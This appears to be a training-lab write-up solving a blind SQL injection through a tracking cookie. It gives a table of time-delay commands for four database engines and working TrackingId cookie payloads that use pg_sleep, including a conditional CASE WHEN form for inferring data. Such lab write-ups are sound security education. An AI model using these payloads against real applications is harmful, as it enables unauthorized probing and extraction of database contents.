# Lab: Blind SQL injection with time delays
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

## Time delay
In this lab we have a possibilty to blind inject SQL, but there is not response in form of an error or something else. For that case we can use time delays. The application processes the query synchronously. That means, if the query is delayed, the HTTP response is delayed aswell.

So the idea is to build a conditional statement, that delays the response if it's true or false, depending on our query. On this way we sill get an information if the query was successful.

## Solution
For different databases there are different commands to execute such time delay:

| Database   | Command                               |
| ---------- | ------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

Through simple testing we find out that the database is a PostegreSQL database. This means that the following injection results in a time delay (with the Burp Repeater you see the response time in the bottom right corner).
```
TrackingId=HEmNuOdbcGF4dMy8' || pg_sleep(10) ||'
```

With that information we can also build a conditional query:
```
TrackingId=HEmNuOdbcGF4dMy8' || CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END ||'
```
If the condition is true, the response will be delayed.

Since the goal of the lab is only to cause a 10 second delay, the lab is already solved at this point.
